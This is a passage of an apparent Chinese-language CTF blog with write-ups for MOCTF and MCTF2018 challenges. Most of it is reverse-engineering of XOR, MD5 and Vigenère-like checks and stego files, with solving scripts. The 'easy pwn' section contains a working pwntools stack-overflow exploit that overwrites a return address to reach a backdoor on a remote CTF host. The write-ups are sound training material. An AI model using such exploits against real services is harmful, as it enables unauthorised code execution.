xrange(int(sys.argv[2])):  # 对输入进行简单约束（不为回车）</span><br><span class="line">    k = state.posix.files[0].read_from(1)</span><br><span class="line">    state.se.add(k!=10)</span><br><span class="line"></span><br><span class="line">k = state.posix.files[0].read_from(1)</span><br><span class="line">state.se.add(k==10)  # 回车为结束符</span><br><span class="line"></span><br><span class="line">state.posix.files[0].seek(0)</span><br><span class="line">state.posix.files[0].length = int(sys.argv[2])+1 # 约束输入长度（大于实际长度也可）</span><br><span class="line"></span><br><span class="line">print &quot;[*]simgr start-------------------------------&quot;</span><br><span class="line"></span><br><span class="line">sm = p.factory.simgr(state)   # 初始化进程模拟器</span><br><span class="line">sm.explore(find=lambda s:&quot;correct!&quot; in s.posix.dumps(1)) # 寻找运行过程中存在 “correct！”的路径，并丢弃其他路径</span><br><span class="line">print &quot;[*]program excuted---------------------------&quot;</span><br><span class="line"></span><br><span class="line">for pp in sm.found:</span><br><span class="line">    out = pp.posix.dumps(1)   # 表示程序的输出</span><br><span class="line">    print out</span><br><span class="line">    inp = pp.posix.files[0].all_bytes()  # 取输入的变量</span><br><span class="line">    print pp.solver.eval(inp,cast_to = str)  # 利用约束求解引擎求解输入</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-MOCTF-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/10/31/MOCTF-1/" class="article-date">
      <time datetime="2018-10-31T13:25:57.000Z" itemprop="datePublished">2018-10-31</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/31/MOCTF-1/">MOCTF-1</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="SO-EASY"><a href="#SO-EASY" class="headerlink" title="SO EASY"></a>SO EASY</h1><p>虽然程序很大，但是在main函数里直接可以看见flag。</p>
<h1 id="跳跳跳"><a href="#跳跳跳" class="headerlink" title="跳跳跳"></a>跳跳跳</h1><p>还是🎲游戏，千篇一律，nop掉判断就好了,最后给出的字符串base64解密得到flag。</p>
<h1 id="暗恋的苦恼"><a href="#暗恋的苦恼" class="headerlink" title="暗恋的苦恼"></a>暗恋的苦恼</h1><p>给了加密程序，密文，密钥，要推算出明文。</p>
<p>ida打开，定位到加密函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v7 = strlen(a1);</span><br><span class="line">v6 = strlen(a2);</span><br><span class="line">v4 = 0;</span><br><span class="line">v3 = operator new(0xFFu);</span><br><span class="line">for ( i = 0; i &lt; v7; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  if ( v4 == v6 )</span><br><span class="line">    v4 = 0;</span><br><span class="line">  v3[i] = sub_401005(a1[i], a2[v4++]);</span><br><span class="line">&#125;</span><br><span class="line">v3[i] = 0;</span><br><span class="line">return v3;</span><br></pre></td></tr></table></figure>
<p>每一位密钥对每一位明文操作，当密钥用完时从头再取。<br>sub_401005:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v4 = toupper(a1);</span><br><span class="line">v5 = toupper(a2);</span><br><span class="line">if ( v4 == &apos; &apos; )</span><br><span class="line">  return v4;</span><br><span class="line">for ( i = 0; i &lt; v4 - 65; ++i )</span><br><span class="line">  ++v5;</span><br><span class="line">if ( v5 &gt; 90 )</span><br><span class="line">  result = v5 - 25;</span><br><span class="line">else</span><br><span class="line">  result = v5;</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure>
<p>toupper是转换为大写。<code>v5+=v4-65</code>，然后根据v5的值决定返回值。<br>然而不知道</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ( v5 &gt; 90 )</span><br><span class="line">  result = v5 - 25;</span><br><span class="line">else</span><br><span class="line">  result = v5;</span><br></pre></td></tr></table></figure>
<p>这一部分怎么逆好，就把两种情况都写了…结合题目中有具体意义的提示应该也不失为一种方法吧23333:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mingwen=&quot;&quot;</span><br><span class="line">miwen=&quot;QWDRILDWNTW&quot;</span><br><span class="line">miyao=&quot;ILOVEMOCTF&quot;</span><br><span class="line">for i in range(len(miwen)):</span><br><span class="line">	v5=ord(miwen[i])</span><br><span class="line">	v4=65+v5-ord(miyao[i%9])</span><br><span class="line">	mingwen+=chr(v4)</span><br><span class="line">print mingwen</span><br><span class="line">mingwen=&quot;&quot;</span><br><span class="line">for i in range(len(miwen)):</span><br><span class="line">	v5=ord(miwen[i])+25</span><br><span class="line">	v4=65+v5-ord(miyao[i%9])</span><br><span class="line">	mingwen+=chr(v4)</span><br><span class="line">print mingwen</span><br></pre></td></tr></table></figure>
<h1 id="crakeme2"><a href="#crakeme2" class="headerlink" title="crakeme2"></a>crakeme2</h1><p>简单的异或，逆运算得到一串十六进制数字，ascii得到flag。</p>
<p><del>you get flag ， but it … -1s？XD</del></p>
<h1 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy pwn"></a>easy pwn</h1><p>栈溢出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+4h] [ebp-14h]</span><br><span class="line"></span><br><span class="line">gets(&amp;s);</span><br><span class="line">return puts(&amp;s);</span><br></pre></td></tr></table></figure>
<p>后门函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0804850B                 public success</span><br><span class="line">.text:0804850B success         proc near</span><br><span class="line">.text:0804850B ; __unwind &#123;</span><br><span class="line">.text:0804850B                 push    ebp</span><br><span class="line">.text:0804850C                 mov     ebp, esp</span><br><span class="line">.text:0804850E                 sub     esp, 8</span><br><span class="line">.text:08048511                 sub     esp, 0Ch</span><br><span class="line">.text:08048514                 push    offset s        ; &quot;you success gets flag&quot;</span><br><span class="line">.text:08048519                 call    _puts</span><br><span class="line">.text:0804851E                 add     esp, 10h</span><br><span class="line">.text:08048521                 sub     esp, 0Ch</span><br><span class="line">.text:08048524                 push    offset command  ; &quot;cat flag&quot;</span><br><span class="line">.text:08048529                 call    _system</span><br><span class="line">.text:0804852E                 add     esp, 10h</span><br><span class="line">.text:08048531                 nop</span><br><span class="line">.text:08048532                 leave</span><br><span class="line">.text:08048533                 retn</span><br><span class="line">.text:08048533 ; &#125; // starts at 804850B</span><br></pre></td></tr></table></figure>
<p>脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;139.199.177.55&quot;,10001)</span><br><span class="line">sh.recvuntil(&quot;easy?\n&quot;)</span><br><span class="line">system=0x0804850b</span><br><span class="line">payload=&apos;a&apos;*0x18+p32(0x0804850b)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-MCTF2018-2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/10/30/MCTF2018-2/" class="article-date">
      <time datetime="2018-10-30T15:15:37.000Z" itemprop="datePublished">2018-10-30</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/30/MCTF2018-2/">MCTF2018-2</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="identify"><a href="#identify" class="headerlink" title="identify"></a>identify</h1><p>ida打开，搜索字符串，找到了提示错误用户名和密码的字符串，并由此找到了关键函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">v17 = xmmword_402210;</span><br><span class="line">  v18 = xmmword_402200;</span><br><span class="line">  v2 = &quot;WELCOME TO MCTF\n&quot;;</span><br><span class="line">  v19 = xmmword_402220;</span><br><span class="line">  v3 = aWelcomeToMctf[0];</span><br><span class="line">  v23 = 0xF5;</span><br><span class="line">  v25 = 0;</span><br><span class="line">  v20 = xmmword_4021F0;</span><br><span class="line">  v21 = xmmword_402240;</span><br><span class="line">  v22 = xmmword_402230;</span><br><span class="line">  for ( i = 0i64; *v2; v3 = *v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    putchar(v3);</span><br><span class="line">    ++v2;</span><br><span class="line">    fflush(0);</span><br><span class="line">    Sleep(0x64u);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a2 == 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401040(&quot;~checking:&quot;);</span><br><span class="line">    sub_401080();</span><br><span class="line">    v5 = strcmp(*(const char **)(a3 + 4), &quot;Mirage&quot;);</span><br><span class="line">    if ( v5 )</span><br><span class="line">      v5 = -(v5 &lt; 0) | 1;</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401040(&quot;Incorrect username\n&quot;);</span><br><span class="line">      sub_401010(&quot;fail\n&quot;);</span><br><span class="line">      system(&quot;pause&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401040(&quot;\nCorrect Username\n&quot;);</span><br><span class="line">    v6 = *(const char **)(a3 + 8);</span><br><span class="line">    v7 = 0;</span><br><span class="line">    if ( strlen(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = v7 &amp; 0x80000001;</span><br><span class="line">        v8 = (v7 &amp; 0x80000001) == 0;</span><br><span class="line">        if ( (v7 &amp; 0x80000001 &amp; 0x80000000) != 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = ((_BYTE)v9 - 1) | 0xFFFFFFFE;</span><br><span class="line">          v8 = v10 == -1;</span><br><span class="line">          v9 = v10 + 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( (v6[v7] ^ 0x88) != *((_DWORD *)&amp;v17 + v7) )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = &quot;\nIncorrect password\n&quot;;</span><br><span class="line">            v12 = 10;</span><br><span class="line">            do</span><br><span class="line">            &#123;</span><br><span class="line">              putchar(v12);</span><br><span class="line">              ++v11;</span><br><span class="line">              fflush(0);</span><br><span class="line">              Sleep(0x64u);</span><br><span class="line">              v12 = *v11;</span><br><span class="line">            &#125;</span><br><span class="line">            while ( *v11 );</span><br><span class="line">            sub_401010(&quot;fail\n&quot;);</span><br><span class="line">            goto LABEL_25;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( v9 == 1 &amp;&amp; (v6[v7] ^ 0x66) != *((_DWORD *)&amp;v17 + v7) )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_401040(&quot;\nIncorrect password\n&quot;);</span><br><span class="line">          sub_401010(&quot;fail\n&quot;);</span><br><span class="line">          goto LABEL_25;</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v7 &lt; strlen(v6) );</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = &quot;~checking:&quot;;</span><br><span class="line">    v14 = 126;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      putchar(v14);</span><br><span class="line">      ++v13;</span><br><span class="line">      fflush(0);</span><br><span class="line">      Sleep(0x64u);</span><br><span class="line">      v14 = *v13;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( *v13 );</span><br><span class="line">    sub_401080();</span><br><span class="line">    v15 = &quot;\nCongratulations!\n&quot;;</span><br><span class="line">    v16 = 10;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      putchar(v16);</span><br><span class="line">      ++v15;</span><br><span class="line">      fflush(0);</span><br><span class="line">      Sleep(0x64u);</span><br><span class="line">      v16 = *v15;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( *v15 );</span><br><span class="line">    sub_401010(&quot;success\n&quot;);</span><br><span class="line">LABEL_25:</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401010(&quot;[ERROR] Login information missing\n&quot;);</span><br><span class="line">    sub_401010(&quot;Usage: %s &lt;username&gt; &lt;password&gt;\n&quot;, *(_DWORD *)a3);</span><br><span class="line">    result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure>
<p>显然用户名是Mirage，而密码就需要进行异或运算了。</p>
<p>密码下标为偶数的部分异或0x88后与固定字符串相等。</p>
<p>密码下标为奇数的部分异或0x66后与固定字符串相等。</p>
<p>逆运算脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key=[0xc5,0x25,0xdc,0x20,0xf3,0x3e,0xb8,0x14,0xd7,0x57,0xfb,0x39,0xf9,0x13,0xb9,0x12,0xed,0x39,0xfb,0x57,0xe5,0x16,0xe4,0x53,0xf5]</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">    if i&amp;1 == 0:</span><br><span class="line">	   flag+=chr(key[i]^0x88)</span><br><span class="line">    if i&amp;1 == 1:</span><br><span class="line">        flag+=chr(key[i]^0x66)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<h1 id="吃鲨鱼"><a href="#吃鲨鱼" class="headerlink" title="吃鲨鱼"></a>吃鲨鱼</h1><p>peid看了一下发现是c#，拖进dnspy：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">private void button1_Click(object sender, EventArgs e)</span><br><span class="line">		&#123;</span><br><span class="line">			string text = this.textBox1.Text;</span><br><span class="line">			string[] array = new string[]</span><br><span class="line">			&#123;</span><br><span class="line">				&quot;69691c7bdcc3ce6d5d8a1361f22d04ac&quot;,</span><br><span class="line">				&quot;0d61f8370cad1d412f80b84d143e1257&quot;,</span><br><span class="line">				&quot;b9ece18c950afbfa6b0fdbfa4ff731d3&quot;,</span><br><span class="line">				&quot;800618943025315f869e4e1f09471012&quot;,</span><br><span class="line">				&quot;f95b70fdc3088560732a5ac135644506&quot;,</span><br><span class="line">				&quot;4a8a08f09d37b73795649038408b5f33&quot;,</span><br><span class="line">				&quot;03c7c0ace395d80182db07ae2c30f034&quot;,</span><br><span class="line">				&quot;2510c39011c5be704182423e3a695e91&quot;,</span><br><span class="line">				&quot;0cc175b9c0f1b6a831c399e269772661&quot;,</span><br><span class="line">				&quot;4b43b0aee35624cd95b910189b3dc231&quot;,</span><br><span class="line">				&quot;83878c91171338902e0fe0fb97a8c47a&quot;,</span><br><span class="line">				&quot;b14a7b8059d9c055954c92674ce60032&quot;,</span><br><span class="line">				&quot;6f8f57715090da2632453988d9a1501b&quot;,</span><br><span class="line">				&quot;8277e0910d750195b448797616e091ad&quot;,</span><br><span class="line">				&quot;e4da3b7fbbce2345d7772b0674a318d5&quot;,</span><br><span class="line">				&quot;cbb184dd8e05c9709e5dcaedaa0495cf&quot;</span><br><span class="line">			&#125;;</span><br><span class="line">			if (text.Length &gt; 16)</span><br><span class="line">			&#123;</span><br><span class="line">				this.label2.Text = &quot;You are wrong!&quot;;</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			for (int i = 0; i &lt; text.Length; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				char[] array2 = new char[]</span><br><span class="line">				&#123;</span><br><span class="line">					&apos;H&apos;</span><br><span class="line">				&#125;;</span><br><span class="line">				array2[0] = text[i];</span><br><span class="line">				string str = new string(array2);</span><br><span class="line">				if (array[i].CompareTo(Form1.fivefive(str)) != 0)</span><br><span class="line">				&#123;</span><br><span class="line">					this.label2.Text = &quot;You are wrong!&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">				else</span><br><span class="line">				&#123;</span><br><span class="line">					this.label2.Text = &quot;You are right!&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>找到了这里，并且发现程序中有一些地方出现了md5，把定义的array的每个字符串md5解密一下得到了flag。</p>
<h1 id="Math-for-kids"><a href="#Math-for-kids" class="headerlink" title="Math for kids"></a>Math for kids</h1>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-MCTF2018-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/10/27/MCTF2018-1/" class="article-date">
      <time datetime="2018-10-27T05:18:44.000Z" itemprop="datePublished">2018-10-27</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/27/MCTF2018-1/">MCTF2018-1</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="hello-hello"><a href="#hello-hello" class="headerlink" title="hello hello"></a>hello hello</h1><p>ida打开：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mov     [rbp+s2], 4Dh ; &apos;M&apos;</span><br><span class="line">mov     [rbp+var_5F], 43h ; &apos;C&apos;</span><br><span class="line">mov     [rbp+var_5E], 54h ; &apos;T&apos;</span><br><span class="line">mov     [rbp+var_5D], 46h ; &apos;F&apos;</span><br><span class="line">mov     [rbp+var_5C], 7Bh ; &apos;&#123;&apos;</span><br><span class="line">mov     [rbp+var_5B], 77h ; &apos;w&apos;</span><br><span class="line">mov     [rbp+var_5A], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_59], 31h ; &apos;1&apos;</span><br><span class="line">mov     [rbp+var_58], 63h ; &apos;c&apos;</span><br><span class="line">mov     [rbp+var_57], 6Fh ; &apos;o&apos;</span><br><span class="line">mov     [rbp+var_56], 6Dh ; &apos;m&apos;</span><br><span class="line">mov     [rbp+var_55], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_54], 5Fh ; &apos;_&apos;</span><br><span class="line">mov     [rbp+var_53], 32h ; &apos;2&apos;</span><br><span class="line">mov     [rbp+var_52], 6Fh ; &apos;o&apos;</span><br><span class="line">mov     [rbp+var_51], 5Fh ; &apos;_&apos;</span><br><span class="line">mov     [rbp+var_50], 52h ; &apos;R&apos;</span><br><span class="line">mov     [rbp+var_4F], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_4E], 76h ; &apos;v&apos;</span><br><span class="line">mov     [rbp+var_4D], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_4C], 72h ; &apos;r&apos;</span><br><span class="line">mov     [rbp+var_4B], 73h ; &apos;s&apos;</span><br><span class="line">mov     [rbp+var_4A], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_49], 5Fh ; &apos;_&apos;</span><br><span class="line">mov     [rbp+var_48], 57h ; &apos;W&apos;</span><br><span class="line">mov     [rbp+var_47], 6Fh ; &apos;o&apos;</span><br><span class="line">mov     [rbp+var_46], 72h ; &apos;r&apos;</span><br><span class="line">mov     [rbp+var_45], 31h ; &apos;1&apos;</span><br><span class="line">mov     [rbp+var_44], 64h ; &apos;d&apos;</span><br><span class="line">mov     [rbp+var_43], 7Dh ; &apos;&#125;&apos;</span><br></pre></td></tr></table></figure>
<h1 id="drink-coffee"><a href="#drink-coffee" class="headerlink" title="drink coffee"></a>drink coffee</h1><p>luyten打开，check函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public static boolean CHECK(final int input) &#123;</span><br><span class="line">        if (input &gt; 10000000 &amp;&amp; input &lt; 99999999) &#123;</span><br><span class="line">            int v7 = 1;</span><br><span class="line">            int v8 = 10000000;</span><br><span class="line">            int v9 = 1;</span><br><span class="line">            if (Math.abs(input / 1000 % 100 - 80) == 3 &amp;&amp; input % 1000 % 927 == 0) &#123;</span><br><span class="line">                for (int v10 = 0; v10 &lt; 4; ++v10) &#123;</span><br><span class="line">                    if (input / v7 % 10 != input / v8 % 10) &#123;</span><br><span class="line">                        v9 = 0;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                    v7 *= 10;</span><br><span class="line">                    v8 /= 10;</span><br><span class="line">                &#125;</span><br><span class="line">                if (v9 != 1) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">                if (v9 == 1) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>本来想用这几天在研究的z3求解的…可是前面两题到现在也没能解出来…这一题运行z3脚本一直卡住，没有任何提示orz。<br>只好不用z3，魔改了原代码求passwd：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10000000,99999999):</span><br><span class="line">    v7 = 1</span><br><span class="line">    v8 = 10000000</span><br><span class="line">    v9 = 1</span><br><span class="line">    if (abs(i / 1000 % 100 - 80) == 3 and i % 1000 % 927 == 0):</span><br><span class="line">        for j in range(4):</span><br><span class="line">            if (i / v7 % 10 != i / v8 % 10):</span><br><span class="line">                v9 = 0</span><br><span class="line">                break</span><br><span class="line">            v7 *= 10</span><br><span class="line">            v8 /= 10</span><br><span class="line">        if (v9 == 1):</span><br><span class="line">            print i</span><br></pre></td></tr></table></figure>
<p>运行后打印出passwd，输入后得到flag。</p>
<h1 id="听说你是萌新"><a href="#听说你是萌新" class="headerlink" title="听说你是萌新"></a>听说你是萌新</h1><p>一张jpg，hexfiend打开在文件末尾得到flag。</p>
<h1 id="不如…"><a href="#不如…" class="headerlink" title="不如…"></a>不如…</h1><p>一张png，binwalk看一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 1332 x 747, 8-bit/color RGBA, non-interlaced</span><br><span class="line">830060        0xCAA6C         End of Zip archive</span><br></pre></td></tr></table></figure>
<p>发现是zip结尾，搜索IEND找到png的结尾，然后把后面的zip全部copy下来保存为新文件。mac直接可以解压，但是解压出来的docx啥也看不见，开虚拟机用windows看了一下发现有密码，所以应该就是伪加密了，找到第二个PK后标记有无密码的位置，把01改为00，解压后查看docx得到flag。</p>
